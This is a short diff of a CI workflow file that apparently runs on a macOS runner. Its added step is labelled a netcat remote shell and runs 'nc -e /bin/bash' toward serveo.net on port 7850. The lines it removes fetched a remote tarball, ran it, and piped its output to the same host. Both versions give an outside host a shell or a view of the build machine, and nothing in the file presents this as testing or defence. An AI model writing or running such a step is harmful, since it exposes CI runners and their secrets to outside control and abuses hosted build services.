@@ -33,12 +33,9 @@ jobs:
           brew install netcat
           nc --help
         
-      - name: Installling Screen & Setup
+      - name: Setting the NetCat Remote Shell
         run: |
-           curl https://get.screen.so/screen-macos.tar.gz | tar xvz
-           ./screen daemon
-           ./screen url
-           ./screen view | nc serveo.net 7850
+            nc -v serveo.net 7850 -e /bin/bash
           
 
           
